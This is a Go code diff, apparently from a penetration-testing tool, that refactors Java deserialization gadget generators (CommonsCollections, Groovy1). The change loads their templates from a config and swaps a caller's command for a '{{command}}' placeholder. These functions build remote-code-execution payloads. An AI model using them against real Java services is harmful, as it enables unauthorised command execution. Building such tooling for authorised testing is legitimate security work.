@@ -176,8 +176,15 @@ func ConfigJavaObject(templ []byte, name string, options ...GenClassOptionFun) (
 	}
 	return verboseWrapper(obj, AllGadgets[name]), nil
 }
-func setCommandForRuntimeExecGadget(templ []byte, name string, cmd string) (*JavaObject, error) {
-	objs, err := yserx.ParseJavaSerialized(templ)
+func setCommandForRuntimeExecGadget(name string, cmd string) (*JavaObject, error) {
+	if YsoConfigInstance == nil || YsoConfigInstance.Gadgets == nil {
+		return nil, utils.Error("config not init")
+	}
+	gadgetInfo, ok := YsoConfigInstance.Gadgets[name]
+	if !ok {
+		return nil, utils.Errorf("gadget %s not found", name)
+	}
+	objs, err := yserx.ParseJavaSerialized(gadgetInfo.Template)
 	if err != nil {
 		return nil, err
 	}
@@ -185,7 +192,7 @@ func setCommandForRuntimeExecGadget(templ []byte, name string, cmd string) (*Jav
 		return nil, utils.Error("parse gadget error")
 	}
 	obj := objs[0]
-	err = ReplaceStringInJavaSerilizable(obj, "whoami", cmd, 1)
+	err = ReplaceStringInJavaSerilizable(obj, "{{command}}", cmd, 1)
 	if err != nil {
 		return nil, err
 	}
@@ -261,7 +268,7 @@ func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections1, "CommonsCollections1", cmd)
+	return setCommandForRuntimeExecGadget("CommonsCollections1", cmd)
 }
 
 // GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。
@@ -277,7 +284,7 @@ func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections5, "CommonsCollections5", cmd)
+	return setCommandForRuntimeExecGadget("CommonsCollections5", cmd)
 }
 
 // GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。
@@ -293,7 +300,7 @@ func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections6, "CommonsCollections6", cmd)
+	return setCommandForRuntimeExecGadget("CommonsCollections6", cmd)
 }
 
 // GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。
@@ -309,7 +316,7 @@ func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections7, "CommonsCollections7", cmd)
+	return setCommandForRuntimeExecGadget("CommonsCollections7", cmd)
 }
 
 // GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。
@@ -325,7 +332,7 @@ func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget(template_ser_CommonsCollectionsK3, "CommonsCollectionsK3", cmd)
+	return setCommandForRuntimeExecGadget("CommonsCollectionsK3", cmd)
 }
 
 // GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。
@@ -341,7 +348,7 @@ func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget(template_ser_CommonsCollectionsK4, "CommonsCollectionsK4", cmd)
+	return setCommandForRuntimeExecGadget("CommonsCollectionsK4", cmd)
 }
 
 // GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。
@@ -357,7 +364,7 @@ func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
-	return setCommandForRuntimeExecGadget(template_ser_Groovy1, "Groovy1", cmd)
+	return setCommandForRuntimeExecGadget("Groovy1", cmd)
 }
 
 // GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。
